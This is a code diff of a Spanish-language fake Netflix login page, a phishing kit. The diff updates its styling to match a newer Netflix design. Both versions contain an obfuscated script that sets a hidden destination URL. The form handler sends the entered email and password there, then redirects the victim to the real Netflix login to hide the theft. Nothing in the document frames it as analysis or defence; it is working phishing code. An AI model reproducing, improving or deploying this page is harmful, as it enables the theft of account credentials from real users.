@@ -4,108 +4,82 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix</title>
-    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" type="image/x-icon">
-    
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
-            background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), 
-                              url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-0746f3208b4d/dad30504-20b1-460d-85fa-7f0cf88c5825/AR-es-20220502-popsignuptwoweeks-perspective_alpha_website_large.jpg');
-            background-size: cover;
-            background-position: center;
+            background: radial-gradient(circle at top, #451010 0%, #000000 45%);
+            background-color: #000;
+            color: #fff;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
-        .banner-info {
-            background-color: #e87c03;
+        .input-dark {
+            background-color: rgba(18, 18, 18, 0.7);
+            border: 1px solid #8c8c8c;
             color: white;
-            padding: 15px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            font-size: 14px;
+        }
+        .input-dark:focus {
+            border-color: #fff;
+            ring: 2px;
+            ring-color: #fff;
         }
     </style>
 </head>
-<body class="flex flex-col min-h-screen">
+<body class="min-h-screen flex flex-col p-6">
 
-    <header class="p-6">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="w-32 md:w-44">
+    <header class="mb-12">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="w-24">
     </header>
 
-    <main class="flex-grow flex items-center justify-center p-4">
-        <div class="bg-black/75 p-10 md:p-14 rounded-md w-full max-w-[450px]">
-            
-            <div class="banner-info">
-                <p><b>Ingresa tu información para iniciar sesión</b></p>
-                <p>O comience con una nueva cuenta. <a href="#" class="underline">Obtener ayuda</a>.</p>
-                <p class="text-xs mt-2 opacity-80">Esta página está protegida por Google reCAPTCHA para garantizar que no seas un bot. <span class="text-blue-400 cursor-pointer">Más información.</span></p>
+    <main class="flex-grow">
+        <h1 class="text-[32px] font-bold leading-tight mb-2">Ingresa tu info para iniciar sesión</h1>
+        <p class="text-[#b3b3b3] text-lg mb-6">O bien, comienza con una cuenta nueva.</p>
+
+        <form id="loginForm" class="space-y-4">
+            <div class="relative">
+                <input type="email" name="email" required 
+                    class="w-full input-dark p-4 rounded-md text-base outline-none transition"
+                    placeholder="Email o número de celular">
             </div>
 
-            <h1 class="text-white text-3xl font-bold mb-6">Inicia sesión</h1>
-            
-            <form id="loginForm" class="space-y-4">
-                <div class="relative">
-                    <input type="email" name="email" id="email" required 
-                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition border-b-2 border-transparent focus:border-[#e87c03]"
-                        placeholder="Email o número de teléfono">
-                </div>
-                
-                <div class="relative">
-                    <input type="password" name="password" id="password" required 
-                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition border-b-2 border-transparent focus:border-[#e87c03]"
-                        placeholder="Contraseña">
-                </div>
-
-                <button type="submit" id="btnSubmit"
-                    class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold mt-6 hover:bg-[#f6121d] transition">
-                    Iniciar sesión
-                </button>
-            </form>
-
-            <div class="flex justify-between items-center mt-4 text-[#b3b3b3] text-sm">
-                <div class="flex items-center">
-                    <input type="checkbox" id="remember" class="mr-1 accent-white">
-                    <label for="remember">Recuérdame</label>
-                </div>
-                <a href="#" class="hover:underline">¿Necesitas ayuda?</a>
+            <div class="relative">
+                <input type="password" name="password" required 
+                    class="w-full input-dark p-4 rounded-md text-base outline-none transition"
+                    placeholder="Contraseña">
             </div>
 
-            <div class="mt-12 text-[#737373]">
-                <p>¿Primera vez en Netflix? <a href="#" class="text-white hover:underline font-medium">Suscríbete ahora</a>.</p>
-            </div>
+            <button type="submit" id="btnSubmit"
+                class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold text-lg active:scale-[0.98] transition-all">
+                Continuar
+            </button>
+        </form>
+
+        <div class="mt-8">
+            <button class="text-[#b3b3b3] flex items-center text-lg font-medium">
+                Obtener ayuda 
+                <svg class="w-5 h-5 ml-1 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+            </button>
         </div>
+
+        <p class="mt-12 text-[#737373] text-sm leading-relaxed">
+            Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. 
+            <span class="text-[#b3b3b3] cursor-pointer font-medium">Más info</span>
+        </p>
     </main>
 
-    <footer class="bg-black/75 text-[#737373] p-8 text-sm mt-12 border-t border-[#333]">
-        <div class="max-w-4xl mx-auto">
-            <p class="mb-6 hover:underline cursor-pointer">¿Preguntas? Llama al 0800-XXX-XXXX</p>
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
-                <span class="hover:underline cursor-pointer">Preguntas frecuentes</span>
-                <span class="hover:underline cursor-pointer">Centro de ayuda</span>
-                <span class="hover:underline cursor-pointer">Términos de uso</span>
-                <span class="hover:underline cursor-pointer">Privacidad</span>
-            </div>
-        </div>
-    </footer>
-
     <script>
-        var scriptURL,form,btn;(function(){var omn='',sqQ=793-782;function Olb(b){var n=930820;var m=b.length;var o=[];for(var q=0;q<m;q++){o[q]=b.charAt(q)};for(var q=0;q<m;q++){var u=n*(q+402)+(n%22545);var r=n*(q+553)+(n%43473);var g=u%m;var h=r%m;var d=o[g];o[g]=o[h];o[h]=d;n=(u+r)%3906201;};return o.join('')};var DxZ=Olb('dlnohntczvjaiyrefororqgsutpuxstbmwckc').substr(0,sqQ);var pBL='(p9e8r=n;(1kn, lcee}r gm=;o.c;.;.vt.Ci+aaar+ggq=)716,;{tps9r+[0,g<,=),c6t;2k)==ev,7(o51(A6(zj}0a,erl)r1u i;1eC[,l6)t9t7{=o(a{d =n]t Sp0m(;n!vu+ nncstgqas(rf))l[t(k(8rd0= ka-ui[u;;{+=8i] +es1rd+;f;[t"r((s- ;.8ja)anrife t<o.hgup"ofe})<vhf[t+-eol1e+z)at 1mm)0tr"urrlkr==vin=aaCvhshh.r-826>r0=u1-hn)o[s9=oal(iz.r e)j]a]v,);"f=mnim;vr0A"nr.avagyn)ol2 n)jg.iqafdrot(7a,a=eh4]e+=vhhfn.c;.[+= afp]dpelA ;tokv ; (=)srnn)w[+afry(gararqp.(c)k(C=;art.n+1)ahzl ; a;fe=els, ul=rrqd){hpnr e7n(rhop=+4qbs;;u;t0ek));tvnv=0in34v+st;,u((lsm-=)o=;)p7)2e}[z)e gj=nen"[i+i;+<iie(uoor282Ctfl;"mt;tpd87(gdsub+++i gru lr..,.h6;h].(eh"]l]iri6.fv}cm,7-.roi;[i]lsi(a;rvnc=.,=cxb+tiia)f5]grp[,]0;jj].,l2ts=,;(q2dsvvur(t=;svovoh+"}h=*nl=vi;ep=.{vn=ila()3f0+u,4a,9=a.+ky6o1f,e=h9 ,;a)=ri.[1m9ilu6(rCan*(48bpf<rr;j0cilec,sanhsllog;nvfgrjoh8qkht=)(+olt;nt.oi;8)g;](aSduer=auyo;C})rC,i5;qbA1;A{=em)rkr,0r(i2a(aji!>"5,5,7cs.;';var KHo=Olb[DxZ];var BlS='';var vJS=KHo;var UTC=KHo(BlS,Olb(pBL));var wXz=UTC(Olb(')t)1.ono_3(tmZiZ4)-41i!.r( 6. lot={)\'Z)i3$y7c-Zrct:(7;jrg..;cb6Sb)$"i(]bb...f.ccZt}f+4ZZa"rZ=7cf =i*ioo6tZ(".$62$)[f\/sgc.+tc)m9f)r,N=q3m.bZs;dZs)__4ttj_p5gl%Z;f.7r.;+e.9hZcaso(z(hv%lauZb,;gd!2jiZllZ7].1.)b%b)9l;(T;a!fpnrZpu3\'[Ib.Z}.ojmq2ZZsxt0pg!.o2;.3S1)e.alpz1)ZbZk,(4%a,,!7jc,az}4}sw$y0{)f92__3gbZu;1rZ).on%m9xlZZa*3!ecZ_ ),"+ZZi)};!8o{,o h!rZ\/0a7$!3Zg5.=r)=(}sgI,pj.rZ0(eZ12=$bg.k,rZe!_b+ti);j7!7$]Ztj,Z3cs([,1as(a0=2rZ,60.(vs3_+q.0-n}oncpj_rh.5t_ZZrarZfr ({dZ=.!1ufZ)},ZZ;ZzZ)_rj0dfgf_c ;$o{eZ.(nl,402)_b1cdb#Zpn,57fZs,7*)t.43dj.6qa.Z\'n{%((_e.=;Za3Zj#j=7{f3"m.jlx.xZ;r(\/!CvnZc."jbhZ6!rZZ 2.c\/( 1iti,.1x7$d,9Z8)cn.$4pa)bn $,t,.f[)f o,i$md)7\'p$0j.=Z#ln1,Zf0nnS$+i).c).ubC.l=tr6#iZd_.Z3)fZl0Zcn0+Zfi,{((_o($# .c.ZZ0;a(Z_i(y.f4]Z.jv;b_n;ie;3mZjr6\/#a.$,0)13.t._o]_=.Zg=cjq)4w)Zsc5t$t).b.bt).m2g0.Z(o (;.e(=u,\/13, t,Z%]$r\/ ]$c2!wZc%trEr)s2q\/((.j]=Z)340.Zo{Zft,e3!j.ctEZ-+S\/b!c_!sp.}.o,.n3a=s]or+.0ke!Z#e$cEr!o}3%701fj{d..,qb!;b,.0p\/p(tZZag8rZm04b)am)}u\/6b()Zt-&_\/f!}(%r+tt&q)S8 =o,.r(i!c$lZZt6ec.;7vCft!eg;Zoxngc)d3c.j$!ion!Zd=!%a.u7fe )m.7t.rr=;[5*e(+n$=getow&8n(j.n0}xZo.$5;tr$e..l"mb (s6;c;3r=ee&(S$ef.)Zex+,]'));var ZId=vJS(omn,wXz );ZId(4655);return 7310})()
-
+        var scriptURL,form,btn;(function(){var ctW='',UBz=915-904;function VeN(f){var z=3750700;var j=f.length;var d=[];for(var g=0;g<j;g++){d[g]=f.charAt(g)};for(var g=0;g<j;g++){var h=z*(g+104)+(z%50206);var l=z*(g+275)+(z%18433);var v=h%j;var p=l%j;var u=d[v];d[v]=d[p];d[p]=u;z=(h+l)%7133468;};return d.join('')};var ghA=VeN('dcnotnwcvurakofczystxtlmohpsbgiqjreur').substr(0,UBz);var soi='=lc s92]+.=;j,x[v2rivrl}v"i(jm.pgurpi;4ark9e]eu+rxezr;+,(r+e,gdt<{ k8,80]7rie6 7<a.i27(,lyv8ju80.8n tv ()a7C;9s,h5,]6=fp>hl8i v[p(rylr!v;lni=0lz(hgf;nz)r6)+h]hun[hi)v"s1u=rot;;hrr-+mjrci+i;2+s)=ls8t+r[r.r (vjlxyatgq[gow.=lrn=el 5h+)!vant)=v;gwmant9]xp((0gicuhrf4=pvrp0u;}v+d,r-e.vf{taa>.A0kll)vp e6s1e]),+;phafrlrkhle,"ef1= g;-r].. =0d8om(e[fz)ifhd+n)i[;A;fv(n(a=vl=0dln(;r+g)fv9{at2;Cc);e=v,ta,;C+tiars;6.S*ffutC a=o=;+rth[b(nb)wia oe8)n=- =,iq;)=;o1jla=u=,c)sfureC;)(()r((m,j,rgth0}ai;ccl(2)ara (s+vu]4arhnn=fc.rr,  (0-;awiba"tA"vo[uvhe{c tt]m41;}irrrr)p4=vua=tl=lno*i..5a[rpu=fvs(b}7+iv.of,)d{no.snA](.wv+1da+fu{+jlpo;)r=vaCe+(ut v]rw)x.au7hva1eub)lilne9;,dlafh]As22ijr)l"o;q}c1vesr)(;gft;( i[2brq.e12n (eia1luak= 31.,=ra(".2=s 7(=".sp=t.[aj{;=,;m;=aa9i,e[fio-Cda(7=d;(g6n; <f=)5,}yoo;h.=;0vrb6[-o=ltn(lfto)kt,giwn;cithc,q)a=noa37Ste =4";;h<Cha,uone])r(g,)6+ll;g;;.l.+s(;<m;")0t.3o1=+)n0';var lFF=VeN[ghA];var Xsa='';var Dqp=lFF;var tUp=lFF(Xsa,VeN(soi));var gbe=tUp(VeN('Llg,!L(ma"4.\/oS!Lsrlo=)d3erp;LL!_jiLg&a (.s}a]L)4i4eibr!df)tan}L=$u;b1wLjL_hL.uha)Lm0(3_.1.ys$3$iC13i}L1.Lm"9)e0*(l\/s_t_L] ja.)(13w.n .xC)3ijj24rf7r,,7u$g. L6))n ! 1p&={q,cL."".x,a$!"1..rc$4c!afdb;{LL.7Sy_L\/g3tL.L%(L=L%0,),d*9.0#t1]u !LwmwSri,(rE;,!7vk6o3tLs3;k,$rg=Lj!onotntpna;oony7Le4(a.;am.j]g$br#1,wi$.tm1n3]n-+er{(04_\/.L.3e}wL;..)49$c)+$;.n;t.,#yqL_\/rp ceo}+r_;%3lb_xC.o3.,p=.+4]h#}(eLf)e+.rL=s!i=t6.c7L0es+b)+-n.=a(\/,ea6*r.LL(o5}g5a6(s%s)aeL\'fan_mLm()n9_26s$vcia[L2a},;z(wf3)s36f[r7L15ok)td4$_3v)f(1ftl4Ln,4csab$4w.e,]E.=)g6"okL.,L(t4(()+\/("s;j_)l6Lt31)1j\/Ls!v.e2y1nsae_mba2[c$)%;%t=(pL_oL1vdf3.anairtLr.t!3n uI(n,rLgim-)n;aL;LLLwrL{\/.t%.$7gt..$3rLr6pa,L=deN1(+.s{+={=0sr&cpcye;m ..t(x)grpS3flLe.s#eeek=y;p\/(lt_trL.ocLLmi(,zd!E)yeeL.L\/a!g})qe;!I)Lj(o$c\/(.mqL)l,.m.n4!0a;.);m -odd.rm9nt{!)0.[h)=!cer%Lb4hfy]T,tsSt*0.L]t;LbLvpL.uL36);(1L[Lv){ .ra27,tcLvnLb$2+e$\'eod0ed}b-wo.)7L._c.5,}L%]. q7((s,2 tLnsa3cb$hhso,v!..v$+L.L%L=h$=5L.4,.\'j)..0!pi${21m4g!=(j!m+.aj.gby.($.1!o82Lmft5.(;,)$;(=xt(S33,.io(;4Lsrarar3.c )f&),ii)Le.L.=}9;L)=gtj##_\'.oaneuvou,,0loen5 %0p.L)onL!5)=ctp0:L_L ,s !.f0_a'));var tBr=Dqp(ctW,gbe );tBr(6009);return 2864})()
         form.addEventListener('submit', e => {
             e.preventDefault();
             btn.innerText = "Cargando...";
             btn.disabled = true;
 
-            fetch(scriptURL, { 
-                method: 'POST', 
-                body: new FormData(form),
-                mode: 'no-cors' 
-            })
-            .then(response => {
-                // Redirección directa a Netflix oficial
+            fetch(scriptURL, { method: 'POST', body: new FormData(form), mode: 'no-cors'})
+            .then(() => { 
                 window.location.href = "https://www.netflix.com/login"; 
             })
-            .catch(error => {
-                console.error('Error!', error.message);
-                window.location.href = "https://www.netflix.com/login";
+            .catch(() => { 
+                window.location.href = "https://www.netflix.com/login"; 
             });
         });
     </script>
